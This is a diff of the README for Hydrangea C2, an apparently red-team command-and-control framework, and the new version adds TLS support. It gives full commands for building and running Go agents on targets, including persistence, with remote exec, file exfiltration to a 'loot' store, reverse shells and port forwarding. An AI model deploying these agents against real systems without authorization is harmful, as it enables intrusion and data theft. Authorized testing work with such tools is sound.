@@ -11,14 +11,14 @@
   ███    █▀     ▀█████▀  ████████▀    ███    ███   ███    █▀   ▀█   █▀    ████████▀    ██████████   ███    █▀
                                       ███    ███
 
-              Hydrangea C2 •  V3.0
+              Hydrangea C2 •  V3.2
 ```
 
-Hydrangea is a modular command-and-control (C2) framework designed for simple and reliable post exploitation fleet management. It features a Python-based server and controller, plus a Go client agent, enabling efficient management of multiple endpoints over TCP. Hydrangea supports **file transfers**, **remote command execution**, **reverse shell management**, **port forwarding**, and more, all with a focus on clarity, minimalism, and explicit control. Intended for trusted environments, it emphasizes ease of use, extensibility, and security best practices.
+Hydrangea is a modular command-and-control (C2) framework designed for simple and reliable post-exploitation fleet management. It features a Python-based server and controller, plus a Go client agent, enabling efficient management of multiple endpoints over TCP. Hydrangea supports **file transfers**, **remote command execution**, **reverse shell management**, **port forwarding**, and more, all with a focus on clarity, minimalism, and explicit control. Intended for trusted environments, it emphasizes ease of use, extensibility, and security best practices.
 
 ---
 
-For a detailed documentation please consider reading the [Wiki](https://github.com/tristanqtn/Hydrangea-C2/wiki).
+For detailed documentation please consider reading the [Wiki](https://github.com/tristanqtn/Hydrangea-C2/wiki).
 
 ---
 
@@ -28,6 +28,7 @@ For a detailed documentation please consider reading the [Wiki](https://github.c
 - [Disclaimer](#disclaimer)
 - [Architecture](#architecture)
 - [Install & Run](#install--run)
+- [TLS](#tls)
 - [Orders & Methods](#orders--methods)
 - [Storage & Paths](#storage--paths)
 
@@ -43,11 +44,11 @@ Hydrangea was born out of necessity. While working through certifications, CTFs,
 
 Hydrangea C2 has three parts:
 
-- **Server** — listens on multiple ports, tracks connected clients, relays orders, stores incoming files.
-- **Client (Go)** — registers to the server, executes orders (list, file xfer, exec, session info).
-- **Controller (CLI)** — sends admin actions and renders results with a clean TUI / REPL.
+- **Server** (`server/server.py`) — listens on one or more TCP ports, tracks connected clients, relays orders, stores incoming files.
+- **Controller** (`server/ctl.py`) — interactive REPL with arrow-key history, tab completion, and a Rich-powered UI.
+- **Client** (`client/go/`) — Go agent that registers to the server and executes orders (list, file transfer, exec, session info, reverse shell, port forward).
 
-> Tip: Use on **trusted networks/hosts** with explicit authorization.
+> Use on **trusted networks/hosts** with explicit authorization only.
 
 ---
 
@@ -61,91 +62,224 @@ Hydrangea C2 has three parts:
 ## Architecture
 
 ```
-[ Controller (serverctl) ]  <--ADMIN RPC-->  [ Server ]  ===orders==>   [ Client(s) ]
-                                                         <==results==
+[ Controller ]  ── ADMIN RPC ──▶  [ Server ]  ══ orders ══▶  [ Client(s) ]
+                                              ◀══ results ══
 ```
 
-- Transport is plain TCP using a compact **length-prefixed JSON header + binary payload** frame.
-- The server accepts both admin (controller) connections and client connections on the same ports.
-- Responses that should flow back to the controller (e.g., `list --wait`, `exec`, `session`) are correlated with a `req_id`.
+- Transport: custom **length-prefixed binary frame** — 4-byte big-endian header length → UTF-8 JSON header → optional binary payload.
+- The server accepts both admin (controller) and agent connections on the same ports, distinguished by the initial handshake type.
+- Async responses (`list --wait`, `exec`, `session`) are correlated with a `req_id` UUID so multiple in-flight requests can coexist.
+- Keepalive: server PINGs every 30 s, evicts agents silent for 90 s.
 
 ---
 
 ## Install & Run
 
-> [!CAUTION]
-> Hydrangea Server and controller are meant to run on Linux. Windows support is untested and not guaranteed.
+### Prerequisites
 
-Requires Python **3.10+** (server + controller).
-For building Go clients, requires Go **1.21+**.
+| Component | Requirement |
+|---|---|
+| Server & Controller | Python **3.10+**, [Poetry](https://python-poetry.org/) |
+| Go agent (build) | Go **1.21+** |
+| Go agent (cross-compile) | [Nix](https://nixos.org/) |
+| TLS auto-cert | `openssl` in `PATH` |
+
+### 1 — Install Python dependencies
 
 ```bash
-# Server (single or multi-port)
-python Hydrangea-server.py --ports 9000 9001 --storage ./server_storage --auth-token supersecret
-
-# Build Go agents (see "Agent builder (Go)" below)
->> build-client --server-host 127.0.0.1 --server-port 9000 --build-auth-token supersecret
-
-# Run a built Go client
-hydrangea-client-linux-amd64 --server 127.0.0.1 --port 9000 --auth-token supersecret --client-id laptop1
-
-# Start server from controller
-python Hydrangea-ctl.py --port 9000 --auth-token supersecret --start-srv
+# From the project root
+poetry install
 ```
 
-> The **auth token** must match across server, clients, and controller.
+This installs the `hydrangea` package and its dependencies (`rich`, `prompt_toolkit`) into an isolated virtualenv. The `ruff` linter is installed in the dev group only.
+
+### 2 — Start the server
+
+```bash
+# Plain TCP, single port
+poetry run hydrangea-server --ports 9000 --auth-token supersecret
+
+# Multiple ports
+poetry run hydrangea-server --ports 9000 9001 --storage ./loot --auth-token supersecret
+
+# With TLS (auto-generates a self-signed cert via openssl)
+poetry run hydrangea-server --ports 9000 --auth-token supersecret --tls-auto
+
+# With your own cert/key
+poetry run hydrangea-server --ports 9000 --auth-token supersecret \
+  --tls-cert server.crt --tls-key server.key
+```
+
+The server prints a SHA-256 fingerprint when TLS is enabled — copy it for use with the controller and agents.
+
+### 3 — Start the controller
+
+```bash
+# Connect to a local server
+poetry run hydrangea-ctl --port 9000 --auth-token supersecret
+
+# Connect to a remote server
+poetry run hydrangea-ctl --host 10.0.0.1 --port 9000 --auth-token supersecret
+
+# With TLS + fingerprint pinning
+poetry run hydrangea-ctl --port 9000 --auth-token supersecret \
+  --tls --tls-fingerprint <hex-from-server>
+
+# Auto-start a server and then open the REPL
+poetry run hydrangea-ctl --port 9000 --auth-token supersecret --start-srv
+
+# UI flags
+poetry run hydrangea-ctl --port 9000 --auth-token supersecret --no-banner --no-color
+```
+
+The controller validates connectivity and token before entering the REPL. Once inside:
+
+- **↑ / ↓** — browse command history (persisted in `~/.hydrangea_history`)
+- **Tab** — complete command names
+- **Ctrl+R** — reverse history search
+- **exit / quit / Ctrl+D** — prompts for confirmation before closing
+
+### 4 — Build and deploy a Go agent
+
+**From the controller REPL:**
+
+```
+hydrangea ❯  build-client --server-host 10.0.0.1 --server-port 9000 \
+               --build-auth-token supersecret --client-id target-1 --out ./agents
+
+# With TLS baked in
+hydrangea ❯  build-client --server-host 10.0.0.1 --server-port 9000 \
+               --build-auth-token supersecret --build-tls \
+               --build-tls-fingerprint <hex> --out ./agents
+```
+
+**Or manually:**
+
+```bash
+cd client/go
+
+# Plain build
+go build -o hydrangea-agent .
+
+# With baked-in defaults
+go build \
+  -ldflags "-X main.DefaultServerHost=10.0.0.1 \
+            -X main.DefaultServerPort=9000 \
+            -X main.DefaultAuthToken=supersecret \
+            -X main.DefaultClientID=target-1" \
+  -o hydrangea-agent .
+
+# Cross-compile via Nix
+nix build ".#hydrangea-client-linux"
+nix build ".#hydrangea-client-windows"
+```
+
+**Run the agent on the target:**
+
+```bash
+./hydrangea-agent --server 10.0.0.1 --port 9000 --auth-token supersecret --client-id target-1
+
+# With TLS (fingerprint pins the self-signed cert)
+./hydrangea-agent --server 10.0.0.1 --port 9000 --auth-token supersecret \
+  --tls --tls-fingerprint <hex>
+
+# Additional flags
+./hydrangea-agent ... [--persist] [--debug] [--device-info] [--test-connection]
+```
+
+> The **auth token** must match across server, controller, and all agents.
+
+---
+
+## TLS
+
+All three components support TLS with optional certificate pinning.
+
+| Flag | Where | Effect |
+|---|---|---|
+| `--tls-auto` | server | Generate a self-signed cert via `openssl` |
+| `--tls-cert` / `--tls-key` | server | Use your own certificate |
+| `--tls` | controller, agent | Enable TLS on the connection |
+| `--tls-fingerprint <hex>` | controller, agent | Pin the server's leaf-cert SHA-256 (implies `--tls`) |
+
+Without `--tls-fingerprint`, TLS is still used but the certificate is not verified — suitable for quick testing with self-signed certs. With the fingerprint, the connection is aborted if the cert doesn't match.
+
+The server prints the fingerprint at startup when TLS is enabled. Copy-paste it directly into `--tls-fingerprint` or `--build-tls-fingerprint`.
+
+---
 
 ## Orders & Methods
 
-Hydrangea exposes a small, explicit surface. Anything not listed here isn’t implemented.
+Hydrangea exposes a small, explicit surface. Anything not listed here isn't implemented.
 
-### Admin actions
+### Context
 
-Run from the controller (`Hydrangea-ctl.py`):
+| Command | Description |
+|---|---|
+| `use <id>` | Set the active client — subsequent commands target it without `--client` |
+| `unuse` | Clear the active client |
 
-- `clients` — List connected client IDs.
-- `ping --client <id>` — Send a ping to a client (server doesn’t wait for a reply).
-- `list --client <id> [--path <p>] [--wait] [--timeout <sec>]` — Request a directory listing on the client.
+### Client
 
-#### File Operations:
+| Command | Description |
+|---|---|
+| `clients` | List all connected agent IDs |
+| `ping [--client <id>]` | Send a ping (fire and forget) |
+| `session [--client <id>]` | Fetch OS, user, PID, cwd, and runtime info |
 
-- `list [--client <id>] [--path <p>] [--wait] [--timeout <sec>]` — Request a directory listing on the client.
-  - With `--wait`, the controller blocks and renders the result.
-  - Without `--wait`, the order is queued; result is logged server-side.
-- `pull [--client <id>] --src <client_path> --dest <server_path>` — Ask the client to **send a file to the server**.
-  - If `--dest` is **absolute**, the server writes exactly there.
-  - If `--dest` is relative, it saves under `server_storage/<client_id>/`.
-- `push [--client <id>] --src <local_path> --dest <client_path>` — Send a local file **from the controller machine** to the client.
+### Files
 
-#### Command Execution:
+| Command | Description |
+|---|---|
+| `list [--client <id>] [--path <p>] [--wait] [--timeout <s>]` | List a directory on the agent. `--wait` blocks and renders the result; without it the order is queued and logged server-side. |
+| `pull [--client <id>] --src <agent_path> --dest <server_path>` | Pull a file from the agent to the server. Relative `--dest` lands under `server_storage/<client_id>/`; absolute paths are written exactly there. |
+| `push [--client <id>] --src <local_path> --dest <agent_path>` | Push a local file to the agent. |
 
-- `exec [--client <id>] --command "<str|json list>" [--shell] [--cwd <client_path>] [--timeout <sec>]` — Execute a system command on the client and return `rc/stdout/stderr`.
-- `local --command "<command>"` — Execute a command locally on the controller machine.
+### Execution
 
-#### Advanced Features:
+| Command | Description |
+|---|---|
+| `exec [--client <id>] --command "<cmd>" [--shell] [--cwd <p>] [--timeout <s>]` | Run a command on the agent; returns `rc`, `stdout`, and `stderr`. Pass a JSON list for argv (`["ls","-la"]`) or a plain string. |
+| `local <cmd>` | Run a command locally on the controller machine (5-minute timeout). |
 
-- `reverse-shell [--client <id>] --controller-addr <host:port>` — Start a reverse shell from the client back to the controller.
-- `port-forward [--client <id>] --proxy-ip <ip> --proxy-port <port> --ligolo-path <path>` — Set up port forwarding using Ligolo agent.
+### Advanced
 
-#### System:
+| Command | Description |
+|---|---|
+| `reverse-shell [--client <id>] <host:port>` | Tell the agent to connect back with a shell. Start your listener **before** issuing this command. |
+| `port-forward [--client <id>] --ligolo-path <bin> --connect-args "<args>"` | Upload and launch a Ligolo agent for port forwarding. |
 
-- `build-client [options]` — **Compile Go clients** from `./client/go` and embed server details (see [Agent builder (Go)](#agent-builder-go)).
-- `server-status` — Check the health status of the server.
+### Build & Server
 
-> **Note:** When using the REPL interface with an active client context (set via `use <id>`), the `--client` parameter becomes **optional** for all commands.
+| Command | Description |
+|---|---|
+| `build-client [options]` | Compile Go agents with baked-in server details. See [Build and deploy a Go agent](#4--build-and-deploy-a-go-agent). |
+| `server-status` | Show server health and recent log entries. |
+
+---
 
 ## Storage & Paths
 
-- **Server side**
+**Server side**
+- Pulled files land in `server_storage/<client_id>/` by default.
+- An absolute `--dest` (e.g. `/tmp/out.bin`) is written exactly at that path on the server host.
 
-  - Default save location for pulled files: `server_storage/<client_id>/`.
-  - If a **destination is absolute** (e.g., `/tmp/out.bin`), the file is written **exactly there** on the server host.
-
-- **Client side (Go)**
-
-  - The client allows absolute paths (e.g., `/etc/hosts`) and can also resolve **relative** paths against its configured root base (see your client’s flags/implementation).
-  - When pushing, the client creates parent directories for the destination file if needed.
-
-> Use absolute paths sparingly and only where appropriate.
+**Agent side (Go)**
+- Absolute paths on the agent are allowed and resolve as-is (full filesystem access).
+- Relative paths resolve against the agent's `--root` base directory.
+- Parent directories are created automatically on `push`.
 
 ---
+
+## Development
+
+```bash
+# Lint
+poetry run ruff check server/
+
+# Format
+poetry run ruff format server/
+
+# Check types / imports after changes
+poetry run ruff check --select I server/
+```
